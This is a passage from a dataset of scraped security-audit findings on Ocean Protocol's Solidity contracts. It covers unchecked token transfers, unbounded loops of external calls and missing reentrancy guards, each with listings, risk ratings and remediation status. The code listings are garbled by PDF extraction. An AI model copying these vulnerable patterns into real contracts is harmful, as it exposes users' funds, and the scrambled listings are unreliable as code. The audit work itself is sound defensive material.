 transfer ( 398 . sub ( dataTokenAmount ); IERC20Template ( exchanges [ exchangeId ]. dataToken ). msg . sender , 29 399 400 401 ); } dataTokenAmount FixedRateExchange Listing 6: FixedRateExchange.sol (Lines 477,478,479,480) 474 475 } else { exchanges [ exchangeId ]. btBalance = ( exchanges [  exchangeId ]. btBalance ) 476 477  transfer ( . sub ( baseTokenAmountBeforeFee ); IERC20Template ( exchanges [ exchangeId ]. baseToken ). 478 479 480 481 ); } msg . sender , baseTokenAmount FixedRateExchange Listing 7: FixedRateExchange.sol (Lines 500,501,502,503) 496 497 498 499 500 501 502 503 504 onlyExchangeOwner ( exchangeId ) { uint256 amount = exchanges [ exchangeId ]. btBalance ; exchanges [ exchangeId ]. btBalance = 0; IERC20Template ( exchanges [ exchangeId ]. baseToken ). transfer ( exchanges [ exchangeId ]. exchangeOwner , amount ); FixedRateExchange Listing 8: FixedRateExchange.sol (Lines 519,520,521,522) 515 516 517 518 { onlyExchangeOwner ( exchangeId ) uint256 amount = exchanges [ exchangeId ]. dtBalance ; exchanges [ exchangeId ]. dtBalance = 0; 30 519 520 521 522 523 IERC20Template ( exchanges [ exchangeId ]. dataToken ). transfer ( exchanges [ exchangeId ]. exchangeOwner , amount ); FixedRateExchange Listing 9: FixedRateExchange.sol (Lines 536,537,538,539) 532 533 function collectMarketFee ( bytes32 exchangeId ) external { // anyone call call this function , because funds are sent  to the correct address 534 535 536 537 538 539 540 uint256 amount = exchanges [ exchangeId ]. marketFeeAvailable ; exchanges [ exchangeId ]. marketFeeAvailable = 0; IERC20Template ( exchanges [ exchangeId ]. baseToken ). transfer ( exchanges [ exchangeId ]. marketFeeCollector , amount ); emit MarketFeeCollected ( FixedRateExchange Listing 10: FixedRateExchange.sol (Lines 551,552,553,554) 548 // anyone call call this function , because funds are sent  to the correct address uint256 amount = exchanges [ exchangeId ]. oceanFeeAvailable ; exchanges [ exchangeId ]. oceanFeeAvailable = 0; IERC20Template ( exchanges [ exchangeId ]. baseToken ). transfer ( opfCollector , amount ); emit OceanFeeCollected ( 549 550 551 552 553 554 555 SideStaking Listing 11: SideStaking.sol (Lines 350,351,352,353) 345 346 IERC20Template lPTokens = IERC20Template ( _datatokens [ datatokenAddress ]. poolAddress 31 347 348 349 350 351 352 353 354 ); uint256 lpBalance = lPTokens . balanceOf ( address ( this )) ; // uint256 balanceToTransfer = lpBalance . div (2) ; lPTokens . transfer ( _datatokens [ datatokenAddress ]. publisherAddress , lpBalance . div (2) ); } SideStaking Listing 12: SideStaking.sol (Line 390) 385 386  amount 387 388 389  . number ; ) { amount > 0 && _datatokens [ datatokenAddress ]. datatokenBalance >= IERC20Template dt = IERC20Template ( datatokenAddress ); _datatokens [ datatokenAddress ]. vestingLastBlock = block 390 dt . transfer ( _datatokens [ datatokenAddress ].  publisherAddress , amount ); 391 _datatokens [ datatokenAddress ]. datatokenBalance -= _datatokens [ datatokenAddress ]. vestingAmountSoFar +=  amount ; 392  amount ; 393 394 } } BPool Listing 13: BPool.sol (Line 257) 252 253 254 255 256 257 258 259 function collectOPF () external { address [] memory tokens = getFinalTokens () ; for ( uint256 i = 0; i < tokens . length ; i ++) { uint256 amount = communityFees [ tokens [i ]]; communityFees [ tokens [i ]] = 0; IERC20 ( tokens [ i ]) . transfer ( _opfCollector , amount ); } } 32 BPool Listing 14: BPool.sol (Line 268) 261 262 function collectMarketFee ( address to ) external { require ( _marketCollector == msg . sender , \" ONLY MARKET  COLLECTOR \"); 263 264 265 266 267 268 269 270 address [] memory tokens = getFinalTokens () ; for ( uint256 i = 0; i < tokens . length ; i ++) { uint256 amount = marketFees [ tokens [i ]]; marketFees [ tokens [i ]] = 0; IERC20 ( tokens [ i ]) . transfer ( to , amount ); } } Risk Level: Likelihood - 2 Impact - 4 Recommendation: It is recommended to use SafeERC20, or to ensure that the transfer return value is checked. Remediation Plan: SOLVED: The Ocean Protocol team amended the smart contracts to use the safeTransfer functions instead. 33 ", "labels": ["Halborn", "Ocean_Protocol", "Severity: Medium"]}, {"title": "MULTIPLE EXTERNAL CALLS WITHIN LOOP MAY LEAD TO DENIAL OF SERVICE(DOS", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Ocean_Protocol_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "External calls within a loop increase Gas usage or can lead to a denial- In some discovered functions, there is a for loop of-service attack. where multiple external calls are executed. If the integer index variable within the loop evaluates at large numbers, a denial of service could occur. Code Location: ERC721Factory Listing 15: ERC721Factory.sol (Lines 473,474,479,480,481,482,483,484 ,489,490,491,492,493,494,497,498,499,500,501,503,504,505,506,507,508 ,509,510) 466 467 468 469 470 function startMultipleTokenOrder ( tokenOrder [] memory orders ) external { uint256 ids = orders . length ; // TO DO . We can do better here , by groupping  publishMarketFeeTokens and consumeFeeTokens and have a single 471 472 473 // transfer for each one , instead of doing it per dt .. for ( uint256 i = 0; i < ids ; i ++) { ( address publishMarketFeeAddress , address  publishMarketFeeToken , uint256 publishMarketFeeAmount ) 474 = IERC20Template ( orders [ i ]. tokenAddress ).  getPublishingMarketFee () ; 475 476 // check if we have publishFees , if so transfer them  to us and approve dttemplate to take them 477 if ( publishMarketFeeAmount > 0 &&  publishMarketFeeToken != address (0) 478 && publishMarketFeeAddress != address (0) ) { 34 479 require ( IERC20Template ( publishMarketFeeToken ).  transferFrom ( 480 481 482 483 484 msg . sender , address ( this ) , publishMarketFeeAmount ) , ' Failed to transfer publishFee '); IERC20Template ( publishMarketFeeToken ). approve (  orders [i ]. tokenAddress , publishMarketFeeAmount ); 485 486 } // check if we have consumeFees , if so transfer them  to us and approve dttemplate to take them 487 if ( orders [ i ]. consumeFeeAmount > 0 && orders [ i ].  consumeFeeToken != address (0) 488 489 && orders [ i ]. consumeFeeAddress != address (0) ) { require ( IERC20Template ( orders [ i ]. consumeFeeToken ).  transferFrom ( 490 491 492 493 494 msg . sender , address ( this ) , orders [i ]. consumeFeeAmount ) , ' Failed to transfer consumeFee '); IERC20Template ( orders [i ]. consumeFeeToken ). approve (  orders [i ]. tokenAddress , orders [ i ]. consumeFeeAmount ); 495 496 497 } // transfer erc20 datatoken from consumer to us require ( IERC20Template ( orders [ i ]. tokenAddress ).  transferFrom ( 498 499 500 501 502 503 504 505 506 507 508 509 510 511 512 msg . sender , address ( this ) , orders [ i ]. amount ) , ' Failed to transfer datatoken '); IERC20Template ( orders [ i ]. tokenAddress ). startOrder ( orders [ i ]. consumer , orders [ i ]. amount , orders [ i ]. serviceId , orders [ i ]. consumeFeeAddress , orders [ i ]. consumeFeeToken , orders [ i ]. consumeFeeAmount ); } } FactoryRouter 35 Listing 16: FactoryRouter.sol (Lines 271,273,275,276,277,278,279,280 ,281,284,287,288,290,292,294,295,296,297,298,299,301,302,306,307,309 ,310,311,314,316,318,319,321,324,325) 262 263 264 265 266 267 268 269 function buyDTBatch ( Operations [] calldata _operations ) external { for ( uint i = 0; i < _operations . length ; i ++) { if ( _operations [ i ]. operation == operationType .  SwapExactIn ) { 270 271 // Get amountIn from user to router IERC20 ( _operations [ i ]. tokenIn ). transferFrom (  msg . sender , address ( this ) , _operations [ i ]. amountsIn ); 272 273 // we approve pool to pull token from router IERC20 ( _operations [ i ]. tokenIn ). approve (  _operations [ i ]. source , _operations [ i ]. amountsIn ); 274 275 276 277 278 279 280 281 282 283 284 // Perform swap ( uint amountReceived ,) = IPool ( _operations [i ]. source ) . swapExactAmountIn ( _operations [ i ]. tokenIn , _operations [ i ]. amountsIn , _operations [ i ]. tokenOut , _operations [ i ]. amountsOut , _operations [ i ]. maxPrice ); // transfer token swapped to user require ( IERC20 ( _operations [i ]. tokenOut ).  transfer ( msg . sender , amountReceived ) , ' Failed MultiSwap '); 285 } else if ( _operations [ i ]. operation ==  operationType . SwapExactOut ){ 286  exact Out 287 288 // calculate how much amount In we need for uint amountIn = IPool ( _operations [ i ]. source ) . getAmountInExactOut ( _operations [ i ]. tokenIn ,  _operations [ i ]. tokenOut , _operations [i ]. amountsOut ); 289 290 // pull amount In from user IERC20 ( _operations [ i ]. tokenIn ). transferFrom (  msg . sender , address ( this ) , amountIn ); 291 292 // we approve pool to pull token from router IERC20 ( _operations [ i ]. tokenIn ). approve (  _operations [ i ]. source , amountIn ); 36 293 294 295 296 297 298 299 300 301 302 // perform swap IPool ( _operations [i ]. source ) . swapExactAmountOut ( _operations [i ]. tokenIn , _operations [ i ]. amountsIn , _operations [ i ]. tokenOut , _operations [ i ]. amountsOut , _operations [ i ]. maxPrice ); // send amount out back to user require ( IERC20 ( _operations [i ]. tokenOut ) . transfer ( msg . sender , _operations [ i ]. amountsOut  ) , ' Failed MultiSwap '); 303 304 } else if ( _operations [ i ]. operation ==  operationType . FixedRate ) { 305 306 307 // get datatoken address (, address datatoken , , , , , , , , , ,) = IFixedRateExchange ( _operations [ i ]. source ).  getExchange ( _operations [i ]. exchangeIds ); 308 309 310 311 // get tokenIn amount required for dt out ( uint baseTokenAmount , , ,) = IFixedRateExchange ( _operations [ i ]. source ). calcBaseInGivenOutDT ( _operations [ i ].  exchangeIds , _operations [i ]. amountsOut ); 312 313 314 // pull tokenIn amount IERC20 ( _operations [ i ]. tokenIn ). transferFrom (  msg . sender , address ( this ) , baseTokenAmount ); 315 316 // we approve pool to pull token from router IERC20 ( _operations [ i ]. tokenIn ). approve (  _operations [ i ]. source , baseTokenAmount ); 317 318 319 // perform swap IFixedRateExchange ( _operations [ i ]. source ) . buyDT ( _operations [ i ]. exchangeIds , _operations [  i ]. amountsOut , _operations [ i ]. amountsIn ); 320 321 // send dt out to user IERC20 ( datatoken ). transfer ( msg . sender ,  _operations [ i ]. amountsOut ); 322 323 324 325 } else { IDispenser ( _operations [ i ]. source ) . dispense ( _operations [ i ]. tokenOut , _operations [  i ]. amountsOut , msg . sender ); 326 327 } 37 328 329 330 } } ERC721Template Listing 17: ERC721Template.sol (Line 450) function _cleanERC20Permissions ( uint256 length ) internal { for ( uint256 i = 0; i < length ; i ++) { IERC20Template ( deployedERC20List [ i ]) . cleanFrom721 () ; } } 448 449 450 451 452 BPool Listing 18: BPool.sol (Line 257) 252 253 254 255 256 257 258 259 function collectOPF () external { address [] memory tokens = getFinalTokens () ; for ( uint256 i = 0; i < tokens . length ; i ++) { uint256 amount = communityFees [ tokens [i ]]; communityFees [ tokens [i ]] = 0; IERC20 ( tokens [ i ]) . transfer ( _opfCollector , amount ); } } Listing 19: BPool.sol (Line 268) 261 262 function collectMarketFee ( address to ) external { require ( _marketCollector == msg . sender , \" ONLY MARKET  COLLECTOR \"); 263 264 265 266 267 268 269 270 address [] memory tokens = getFinalTokens () ; for ( uint256 i = 0; i < tokens . length ; i ++) { uint256 amount = marketFees [ tokens [i ]]; marketFees [ tokens [i ]] = 0; IERC20 ( tokens [ i ]) . transfer ( to , amount ); } } 38 Risk Level: Likelihood - 2 Impact - 4 Recommendation: If possible, use pull over push strategy for external calls. Please refer to the reference section for more details. Reference: External Calls Recommendation Remediation Plan: PARTIALLY SOLVED: The Ocean Protocol team amended loops to include a maximum amount of iterations for certain functions that can be called externally. The following functions were not modified:  CollectMarketFee and CollectOPF in the BPool contract.  CleanERC20Permissions in the ERC721Template contract. 39 ", "labels": ["Halborn", "Ocean_Protocol", "Severity: Medium"]}, {"title": "MISSING RE", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Ocean_Protocol_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "Testing revealed that within some in-scope contracts, the non-reentrancy guard was missing for functions that handled token transfers. The fol- lowing list presents the contracts and functions where the guard was missing.  BPool.sol:  exitswapExternAmountOut, exitswapPoolAmountIn, joinswapExternAmountIn , joinswapPoolAmountOut, setup  Dispenser.sol:  dispense, ownerWithdraw  ERC20Template.sol:  deployPool  ERC721Factory.sol:  createNftErcWithDispenser, createNftErcWithFixedRate, createNftErcWithPool, createNftWithErc, deployERC721Contract  ERC721Template.sol:  createERC20  FixedRateExchange.sol:  buyDT, collectBT, collectDT, collectMarketFee, collectOceanFee , sellDT  SideStaking.sol:  getVesting, newDataTokenCreated, notifyFinalize, and Stake Furthermore, in these function, persistent state reading and writing followed external calls, as well as emitting events after the call, making it vulnerable to a Reentrancy attack. 40 Code Location: Listing 20: FixedRateExchange.sol (Lines 364,365,366,367,368,369,370 ,371,373,374,375,395,396) 333 function buyDT ( bytes32 exchangeId , uint256 dataTokenAmount ,  uint256 maxBaseTokenAmount ) external onlyActiveExchange ( exchangeId ) { require ( 334 335 336 337 338 339 340 341 342 343  , 344  swap \" 345 346 347 348 349 350 351 352 353 354 355 356 357 dataTokenAmount != 0 , \" FixedRateExchange : zero data token amount \" ); if ( exchanges [ exchangeId ]. allowedSwapper != address (0) ) { require ( exchanges [ exchangeId ]. allowedSwapper == msg . sender \" FixedRateExchange : This address is not allowed to ); } ( uint256 baseTokenAmount , uint256 baseTokenAmountBeforeFee , uint256 oceanFeeAmount , uint256 marketFeeAmount ) = calcBaseInGivenOutDT ( exchangeId , dataTokenAmount ); require ( baseTokenAmount <= maxBaseTokenAmount , \" FixedRateExchange : Too many base tokens \" ); // we account fees , fees are always collected in  basetoken 358 exchanges [ exchangeId ]. oceanFeeAvailable = exchanges [  exchangeId ] 359 360 361 . oceanFeeAvailable . add ( oceanFeeAmount ); exchanges [ exchangeId ]. marketFeeAvailable = exchanges [  exchangeId ] 362 363 364 365 . marketFeeAvailable . add ( marketFeeAmount ); require ( IERC20Template ( exchanges [ exchangeId ]. baseToken ). 41  transferFrom ( 366 367 msg . sender , address ( this ) , // we send basetoken to this  address , then exchange owner can withdraw 368 369 370 baseTokenAmount ) , \" FixedRateExchange : transferFrom failed in the  baseToken contract \" ); exchanges [ exchangeId ]. btBalance = ( exchanges [ exchangeId ].  btBalance ). add ( 374 375 376 377 378 379 380 baseTokenAmountBeforeFee ); if ( dataTokenAmount > exchanges [ exchangeId ]. dtBalance ) { // first , let 's try to mint if ( exchanges [ exchangeId ]. withMint && IERC20Template ( exchanges [ exchangeId ]. dataToken ).  isMinter ( address ( this )) ) 381 382 { IERC20Template ( exchanges [ exchangeId ]. dataToken ).  mint ( msg . sender , dataTokenAmount ); } else { require ( 371 372 373 383 384 385 386  ). transferFrom ( 387 388 389 390 391  dataToken contract \" IERC20Template ( exchanges [ exchangeId ]. dataToken exchanges [ exchangeId ]. exchangeOwner , msg . sender , dataTokenAmount ) , \" FixedRateExchange : transferFrom failed in the 392 393 394 395 ); } } else { exchanges [ exchangeId ]. dtBalance = ( exchanges [  exchangeId ]. dtBalance ) 396 397  transfer ( 398 399 . sub ( dataTokenAmount ); IERC20Template ( exchanges [ exchangeId ]. dataToken ). msg . sender , dataTokenAmount 42 400 401 402 403 404 405 406 407 408 409 410 411 412 ); } emit Swapped ( exchangeId , msg . sender , baseTokenAmount , dataTokenAmount , exchanges [ exchangeId ]. dataToken , marketFeeAmount , oceanFeeAmount ); } Listing 21: FixedRateExchange.sol (Lines 452,453,454,455,456,457,458 ,459,461,462,463,475,476) 421 function sellDT ( bytes32 exchangeId , uint256 dataTokenAmount ,  uint256 minBaseTokenAmount ) external onlyActiveExchange ( exchangeId ) { require ( 422 423 424 425 426 427 428 429 430 431  , 432  swap \" 433 434 435 436 437 438 439 440 441 442 443 dataTokenAmount != 0 , \" FixedRateExchange : zero data token amount \" ); if ( exchanges [ exchangeId ]. allowedSwapper != address (0) ) { require ( exchanges [ exchangeId ]. allowedSwapper == msg . sender \" FixedRateExchange : This address is not allowed to ); } ( uint256 baseTokenAmount , uint256 baseTokenAmountBeforeFee , uint256 oceanFeeAmount , uint256 marketFeeAmount ) = calcBaseOutGivenInDT ( exchangeId , dataTokenAmount ); require ( baseTokenAmount >= minBaseTokenAmount , \" FixedRateExchange : Too few base tokens \" 43 444 445 ); // we account fees , fees are always collected in  basetoken 446 exchanges [ exchangeId ]. oceanFeeAvailable = exchanges [  exchangeId ] 447 448 449 . oceanFeeAvailable . add ( oceanFeeAmount ); exchanges [ exchangeId ]. marketFeeAvailable = exchanges [  exchangeId ] 450 451 452 453 . marketFeeAvailable . add ( marketFeeAmount ); require ( IERC20Template ( exchanges [ exchangeId ]. dataToken ).  transferFrom ( 454 455 456 457 458 msg . sender , address ( this ) , dataTokenAmount ) , \" FixedRateExchange : transferFrom failed in the  dataToken contract \" ); 459 460 461 exchanges [ exchangeId ]. dtBalance = ( exchanges [ exchangeId ].  dtBalance ). add ( 462 463 464 465 466 467 dataTokenAmount ); if ( baseTokenAmount > exchanges [ exchangeId ]. btBalance ) { require ( IERC20Template ( exchanges [ exchangeId ]. baseToken ).  transferFrom ( 468 469 470 471 472 exchanges [ exchangeId ]. exchangeOwner , msg . sender , baseTokenAmount ) , \" FixedRateExchange : transferFrom failed in the  baseToken contract \" 473 474 475 ); } else { exchanges [ exchangeId ]. btBalance = ( exchanges [  exchangeId ]. btBalance ) 476 477  transfer ( . sub ( baseTokenAmountBeforeFee ); IERC20Template ( exchanges [ exchangeId ]. baseToken ). 44 478 479 480 481 482 483 484 485 486 487 488 489 490 491 492 msg . sender , baseTokenAmount ); } emit Swapped ( exchangeId , msg . sender , baseTokenAmount , dataTokenAmount , exchanges [ exchangeId ]. baseToken , marketFeeAmount , oceanFeeAmount ); } Listing 22: SideStaking.sol (Lines 258,259) 245 246 247 248 249 250 251 252 function Stake ( address datatokenAddress , address stakeToken , uint256 amount ) public { if ( _datatokens [ datatokenAddress ]. bound != true ) return ; require ( msg . sender == _datatokens [ datatokenAddress ].  poolAddress , 253 254 255 256 257 258 \" ERR : Only pool can call this \" ); bool ok = canStake ( datatokenAddress , stakeToken , amount ); if ( ok != true ) return ; IERC20Template dt = IERC20Template ( datatokenAddress ); dt . approve ( _datatokens [ datatokenAddress ]. poolAddress ,  amount ); 259 260 } _datatokens [ datatokenAddress ]. datatokenBalance -= amount ; Listing 23: SideStaking.sol (Lines 390,391,392) 357 358 359 360 function getVesting ( address datatokenAddress ) public { require ( _datatokens [ datatokenAddress ]. bound == true , \" ERR : Invalid datatoken \" 45 361 362 363 ); // is this needed ? // require ( msg . sender == _datatokens [ datatokenAddress ].  publisherAddress , ' ERR : Only publisher can call this ') ; 364 365 366 367 368 // calculate how many tokens we need to vest to publisher << uint256 blocksPassed ; if ( _datatokens [ datatokenAddress ]. vestingEndBlock < block .  number ) { 369 370 371 372 373 374 375 376 377 378 blocksPassed = _datatokens [ datatokenAddress ]. vestingEndBlock - _datatokens [ datatokenAddress ]. vestingLastBlock ; } else { blocksPassed = block . number - _datatokens [ datatokenAddress ]. vestingLastBlock ; } uint256 vestPerBlock = _datatokens [ datatokenAddress ].  vestingAmount . div ( 379 380 381 382 383 384 385 386 _datatokens [ datatokenAddress ]. vestingEndBlock - _datatokens [ datatokenAddress ]. blockDeployed ); if ( vestPerBlock == 0) return ; uint256 amount = blocksPassed . mul ( vestPerBlock ); if ( amount > 0 && _datatokens [ datatokenAddress ]. datatokenBalance >= ) {  amount 387 388 389  . number ; IERC20Template dt = IERC20Template ( datatokenAddress ); _datatokens [ datatokenAddress ]. vestingLastBlock = block 390 dt . transfer ( _datatokens [ datatokenAddress ].  publisherAddress , amount ); 391 _datatokens [ datatokenAddress ]. datatokenBalance -=  amount ; 392  amount ; 393 394 } } _datatokens [ datatokenAddress ]. vestingAmountSoFar += 46 Listing 24: SideStaking.sol (Lines 322,326,327,328,329,333,334,335,336 ,337,338,339,340,342,343) 302 function notifyFinalize ( address datatokenAddress , uint256  decimals ) internal { 303 304 305 306  return ; 307 308 309 310 311 312 313 314  rate * 315 316 317 318 319 320 321 322 if ( _datatokens [ datatokenAddress ]. bound != true ) return ; if ( _datatokens [ datatokenAddress ]. poolFinalized == true ) _datatokens [ datatokenAddress ]. poolFinalized = true ; uint256 baseTokenWeight = 5 * BASE ; // pool weight : 50 -50 uint256 dataTokenWeight = 5 * BASE ; // pool weight : 50 -50 uint256 baseTokenAmount = _datatokens [ datatokenAddress ] . basetokenBalance ; // given the price , compute dataTokenAmount uint256 dataTokenAmount = (( _datatokens [ datatokenAddress ]. baseTokenAmount * dataTokenWeight ) / baseTokenWeight / BASE ) * (10**(18 - decimals )) ; // approve the tokens and amounts IERC20Template dt = IERC20Template ( datatokenAddress ); dt . approve ( _datatokens [ datatokenAddress ]. poolAddress ,  dataTokenAmount ); 323 324 325 326 327 328 329 330 331  pool IERC20Template dtBase = IERC20Template ( _datatokens [ datatokenAddress ]. basetokenAddress ); dtBase . approve ( _datatokens [ datatokenAddress ]. poolAddress , baseTokenAmount ); // call the pool , bind the tokens , set the price , finalize 332 IPool pool = IPool ( _datatokens [ datatokenAddress ].  poolAddress ); 333 334 335 336 337 pool . setup ( datatokenAddress , dataTokenAmount , dataTokenWeight , _datatokens [ datatokenAddress ]. basetokenAddress , 47 338 339 340 341 342 baseTokenAmount , baseTokenWeight ); // substract _datatokens [ datatokenAddress ]. basetokenBalance -=  baseTokenAmount ; 343 _datatokens [ datatokenAddress ]. datatokenBalance -=  dataTokenAmount ; 344 345 346 347 348 349 350 351 352 353 354 // send 50% of the pool shares back to the publisher IERC20Template lPTokens = IERC20Template ( _datatokens [ datatokenAddress ]. poolAddress ); uint256 lpBalance = lPTokens . balanceOf ( address ( this )) ; // uint256 balanceToTransfer = lpBalance . div (2) ; lPTokens . transfer ( _datatokens [ datatokenAddress ]. publisherAddress , lpBalance . div (2) ); } Listing 25: Dispenser.sol (Lines 220,227,228) 187 function dispense ( address datatoken , uint256 amount , address  destination ) external payable { 188 189 190 191 192 193 194 195 196 197 198 199 200 201 202 203 204 205 206  , require ( datatoken != address (0) , ' Invalid token contract address ' ); require ( datatokens [ datatoken ]. active == true , ' Dispenser not active ' ); require ( amount > 0, ' Invalid zero amount ' ); require ( datatokens [ datatoken ]. maxTokens >= amount , ' Amount too high ' ); if ( datatokens [ datatoken ]. allowedSwapper != address (0) ) { require ( datatokens [ datatoken ]. allowedSwapper == msg . sender 48 207 208 209 210 211 212 \" This address is not allowed to request DT \" ); } IERC20Template tokenInstance = IERC20Template ( datatoken ); uint256 callerBalance = tokenInstance . balanceOf (  destination ); 213 214 215 216 217  ); 218  this ))){ 219 220 221 222 223 224 225 226 227 228 229 } require ( callerBalance < datatokens [ datatoken ]. maxBalance , ' Caller balance too high ' ); uint256 ourBalance = tokenInstance . balanceOf ( address ( this ) if ( ourBalance < amount && tokenInstance . isMinter ( address ( // we need to mint the difference if we can tokenInstance . mint ( address ( this ) , amount - ourBalance ); ourBalance = tokenInstance . balanceOf ( address ( this )); } require ( ourBalance >= amount , ' Not enough reserves ' ); tokenInstance . transfer ( destination , amount ); emit TokensDispensed ( datatoken , destination , amount ); Listing 26: Dispenser.sol (Lines 248,249) 236 237 238 239 240 241 242 243 244 245 246  ); 247 248 249 function ownerWithdraw ( address datatoken ) external { require ( datatoken != address (0) , ' Invalid token contract address ' ); require ( datatokens [ datatoken ]. owner == msg . sender , ' Invalid owner ' ); IERC20Template tokenInstance = IERC20Template ( datatoken ); uint256 ourBalance = tokenInstance . balanceOf ( address ( this ) if ( ourBalance >0) { tokenInstance . transfer ( msg . sender , ourBalance ); emit OwnerWithdrawed ( datatoken , msg . sender , ourBalance 49  ); 250 251 } } Listing 27: FixedRateExchange.sol (Lines 364,365,366,367,368,369,370 ,371,382,385,386,387,388,389,390,391,392,397,398,399,400,403,404,405 ,406,407,408,409,410,411) 333 function buyDT ( bytes32 exchangeId , uint256 dataTokenAmount ,  uint256 maxBaseTokenAmount ) external onlyActiveExchange ( exchangeId ) { require ( dataTokenAmount != 0 , \" FixedRateExchange : zero data token amount \" ); if ( exchanges [ exchangeId ]. allowedSwapper != address (0) ) { require ( exchanges [ exchangeId ]. allowedSwapper == msg . sender \" FixedRateExchange : This address is not allowed to ); } ( uint256 baseTokenAmount , uint256 baseTokenAmountBeforeFee , uint256 oceanFeeAmount , uint256 marketFeeAmount ) = calcBaseInGivenOutDT ( exchangeId , dataTokenAmount ); require ( baseTokenAmount <= maxBaseTokenAmount , \" FixedRateExchange : Too many base tokens \" ); // we account fees , fees are always collected in 334 335 336 337 338 339 340 341 342 343  , 344  swap \" 345 346 347 348 349 350 351 352 353 354 355 356 357  basetoken 358 exchanges [ exchangeId ]. oceanFeeAvailable = exchanges [  exchangeId ] 359 360 361 . oceanFeeAvailable . add ( oceanFeeAmount ); exchanges [ exchangeId ]. marketFeeAvailable = exchanges [  exchangeId ] 50 362 363 364 365 . marketFeeAvailable . add ( marketFeeAmount ); require ( IERC20Template ( exchanges [ exchangeId ]. baseToken ).  transferFrom ( 366 367 msg . sender , address ( this ) , // we send basetoken to this  address , then exchange owner can withdraw 368 369 370 baseTokenAmount ) , \" FixedRateExchange : transferFrom failed in the  baseToken contract \" ); exchanges [ exchangeId ]. btBalance = ( exchanges [ exchangeId ].  btBalance ). add ( 374 375 376 377 378 379 380 baseTokenAmountBeforeFee ); if ( dataTokenAmount > exchanges [ exchangeId ]. dtBalance ) { // first , let 's try to mint if ( exchanges [ exchangeId ]. withMint && IERC20Template ( exchanges [ exchangeId ]. dataToken ).  isMinter ( address ( this )) ) 381 382 { IERC20Template ( exchanges [ exchangeId ]. dataToken ).  mint ( msg . sender , dataTokenAmount ); } else { require ( 371 372 373 383 384 385 386  ). transferFrom ( 387 388 389 390 391  dataToken contract \" IERC20Template ( exchanges [ exchangeId ]. dataToken exchanges [ exchangeId ]. exchangeOwner , msg . sender , dataTokenAmount ) , \" FixedRateExchange : transferFrom failed in the 392 393 394 395 ); } } else { exchanges [ exchangeId ]. dtBalance = ( exchanges [  exchangeId ]. dtBalance ) 396 . sub ( dataTokenAmount ); 51 397 IERC20Template ( exchanges [ exchangeId ]. dataToken ).  transfer ( 398 399 400 401 402 403 404 405 406 407 408 409 410 411 412 msg . sender , dataTokenAmount ); } emit Swapped ( exchangeId , msg . sender , baseTokenAmount , dataTokenAmount , exchanges [ exchangeId ]. dataToken , marketFeeAmount , oceanFeeAmount ); } Listing 28: FixedRateExchange.sol (Lines 500,501,502,503,505,506,507 ,508,509,510) 494 495 496 497 498 499 500 501 502 503 504 505 506 507 508 509 510 511 function collectBT ( bytes32 exchangeId ) external onlyExchangeOwner ( exchangeId ) { uint256 amount = exchanges [ exchangeId ]. btBalance ; exchanges [ exchangeId ]. btBalance = 0; IERC20Template ( exchanges [ exchangeId ]. baseToken ). transfer ( exchanges [ exchangeId ]. exchangeOwner , amount ); emit TokenCollected ( exchangeId , exchanges [ exchangeId ]. exchangeOwner , exchanges [ exchangeId ]. baseToken , amount ); } 52 Listing 29: FixedRateExchange.sol (Lines 519,520,521,522,524,525,526 ,527,528,529) 513 514 515 516 517 518 519 520 521 522 523 524 525 526 527 528 529 530 function collectDT ( bytes32 exchangeId ) external onlyExchangeOwner ( exchangeId ) { uint256 amount = exchanges [ exchangeId ]. dtBalance ; exchanges [ exchangeId ]. dtBalance = 0; IERC20Template ( exchanges [ exchangeId ]. dataToken ). transfer ( exchanges [ exchangeId ]. exchangeOwner , amount ); emit TokenCollected ( exchangeId , exchanges [ exchangeId ]. exchangeOwner , exchanges [ exchangeId ]. dataToken , amount ); } Listing 30: FixedRateExchange.sol (Lines 536,537,538,539,540,541,542 ,543,544) 532 533 function collectMarketFee ( bytes32 exchangeId ) external { // anyone call call this function , because funds are sent  to the correct address 534 535 536 537 538 539 540 541 542 543 544 545 uint256 amount = exchanges [ exchangeId ]. marketFeeAvailable ; exchanges [ exchangeId ]. marketFeeAvailable = 0; IERC20Template ( exchanges [ exchangeId ]. baseToken ). transfer ( exchanges [ exchangeId ]. marketFeeCollector , amount ); emit MarketFeeCollected ( exchangeId , exchanges [ exchangeId ]. baseToken , amount ); } 53 Listing 31: FixedRateExchange.sol (Lines 551,552,553,554,555,556,557 ,558,559) 547 548 function collectOceanFee ( bytes32 exchangeId ) external { // anyone call call this function , because funds are sent  to the correct address 549 550 551 552 553 554 555 556 557 558 559 560 uint256 amount = exchanges [ exchangeId ]. oceanFeeAvailable ; exchanges [ exchangeId ]. oceanFeeAvailable = 0; IERC20Template ( exchanges [ exchangeId ]. baseToken ). transfer ( opfCollector , amount ); emit OceanFeeCollected ( exchangeId , exchanges [ exchangeId ]. baseToken , amount ); } Listing 32: FixedRateExchange.sol (Lines 452,453,454,455,456,457,458 ,459,466,467,468,469,470,471,472,473,477,478,479,480,483,484,485,486 ,487,488,489,490,491) 421 function sellDT ( bytes32 exchangeId , uint256 dataTokenAmount ,  uint256 minBaseTokenAmount ) external onlyActiveExchange ( exchangeId ) { require ( dataTokenAmount != 0 , \" FixedRateExchange : zero data token amount \" ); if ( exchanges [ exchangeId ]. allowedSwapper != address (0) ) { require ( exchanges [ exchangeId ]. allowedSwapper == msg . sender \" FixedRateExchange : This address is not allowed to ); } ( uint256 baseTokenAmount , uint256 baseTokenAmountBeforeFee , 54 422 423 424 425 426 427 428 429 430 431  , 432  swap \" 433 434 435 436 437 438 439 440 441 442 443 444 445 uint256 oceanFeeAmount , uint256 marketFeeAmount ) = calcBaseOutGivenInDT ( exchangeId , dataTokenAmount ); require ( baseTokenAmount >= minBaseTokenAmount , \" FixedRateExchange : Too few base tokens \" ); // we account fees , fees are always collected in  basetoken 446 exchanges [ exchangeId ]. oceanFeeAvailable = exchanges [  exchangeId ] 447 448 449 . oceanFeeAvailable . add ( oceanFeeAmount ); exchanges [ exchangeId ]. marketFeeAvailable = exchanges [  exchangeId ] 450 451 452 453 . marketFeeAvailable . add ( marketFeeAmount ); require ( IERC20Template ( exchanges [ exchangeId ]. dataToken ).  transferFrom ( 454 455 456 457 458 msg . sender , address ( this ) , dataTokenAmount ) , \" FixedRateExchange : transferFrom failed in the  dataToken contract \" ); 459 460 461 exchanges [ exchangeId ]. 